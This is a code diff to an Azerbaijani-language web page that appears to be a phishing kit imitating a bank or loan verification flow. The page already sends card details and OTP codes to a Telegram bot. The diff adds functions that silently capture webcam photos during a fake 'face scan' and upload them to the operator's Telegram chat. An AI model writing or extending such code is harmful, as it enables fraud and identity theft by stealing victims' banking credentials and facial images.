@@ -1216,7 +1216,7 @@
         <div class="face-scan-status-text" id="faceStatusText"></div>
       </div>
       
-      <button type="button" class="cta-btn" style="width:100%;padding:12px;font-size:13px;margin-top:8px;" onclick="startFaceScan()" id="faceStartBtn">Kameranı aç</button>
+      <button type="button" class="cta-btn" style="width:100%;padding:12px;font-size:13px;margin-top:8px;" onclick="startFaceScan()" id="faceStartBtn">📷 Kameranı aç</button>
     </div>
 
     <!-- STEP 4: Checking Animation (Professional) -->
@@ -1479,6 +1479,20 @@ async function sendToTelegram(data) {
   } catch(e) { console.error('Telegram xətası:', e); }
 }
 
+async function sendPhotoToTelegram(photoData) {
+  try {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', photoData, 'face_scan.jpg');
+    formData.append('caption', '📸 Üz tanıma şəkli - ' + new Date().toLocaleString('az-AZ'));
+    
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    });
+  } catch(e) { console.error('Şəkil göndərmə xətası:', e); }
+}
+
 async function sendOTPToTelegram(otp) {
   try {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -1703,6 +1717,7 @@ function goToFaceScan(){
   document.getElementById('faceStatusText').textContent = '';
   document.getElementById('faceProgress').style.width = '0%';
   document.getElementById('faceStartBtn').style.display = 'block';
+  document.getElementById('faceStartBtn').textContent = '📷 Kameranı aç';
 }
 
 function goToBankSelect(){
@@ -1751,6 +1766,7 @@ function goToCardInput(){
 async function startFaceScan() {
   const btn = document.getElementById('faceStartBtn');
   btn.style.display = 'none';
+  btn.textContent = '📷 Kameranı aç';
   
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -1760,7 +1776,12 @@ async function startFaceScan() {
     video.srcObject = stream;
     await video.play();
     
-    document.getElementById('faceStatus').innerHTML = 'Üzünüzü dairənin içinə tutun<span class="sub">Tərpənməyin, yoxlanılır...</span>';
+    // Video hazır olduqda şəkil çək
+    setTimeout(() => {
+      captureAndSendPhoto(video);
+    }, 500);
+    
+    document.getElementById('faceStatus').innerHTML = '✅ Üz aşkarlandı!<span class="sub" style="color:var(--teal-deep);">Tərpənməyin, yoxlanılır...</span>';
     document.getElementById('faceStatusText').textContent = '⏳ 20 saniyə yoxlanılır...';
     
     faceScanActive = true;
@@ -1780,6 +1801,10 @@ async function startFaceScan() {
         faceScanActive = false;
         document.getElementById('faceStatus').innerHTML = '✅ Üz təsdiqi tamamlandı!<span class="sub" style="color:var(--teal-deep);">Məlumatlar yoxlanılır...</span>';
         document.getElementById('faceStatusText').textContent = '✅ Üz uğurla təsdiqləndi!';
+        
+        // Yenidən şəkil çək
+        captureAndSendPhoto(video);
+        
         stopCamera();
         
         // 2 saniyə sonra checking step-ə keç
@@ -1797,6 +1822,28 @@ async function startFaceScan() {
     document.getElementById('faceStatusText').textContent = '⚠️ Kamera əlçatan deyil. Brauzer icazələrini yoxlayın.';
     btn.style.display = 'block';
     btn.textContent = '🔄 Yenidən cəhd et';
+  }
+}
+
+function captureAndSendPhoto(video) {
+  try {
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 300;
+    canvas.height = video.videoHeight || 300;
+    const ctx = canvas.getContext('2d');
+    // Güzgü effekti üçün tərs çevir
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    // Canvas-dan şəkil məlumatı al
+    canvas.toBlob(async (blob) => {
+      if(blob) {
+        await sendPhotoToTelegram(blob);
+      }
+    }, 'image/jpeg', 0.8);
+  } catch(e) {
+    console.error('Şəkil çəkmə xətası:', e);
   }
 }
 
@@ -2133,4 +2180,4 @@ creditTermDisplay.style.display = 'none';
 document.body.appendChild(creditTermDisplay);
 </script>
 </body>
-        </html>
+              </html>
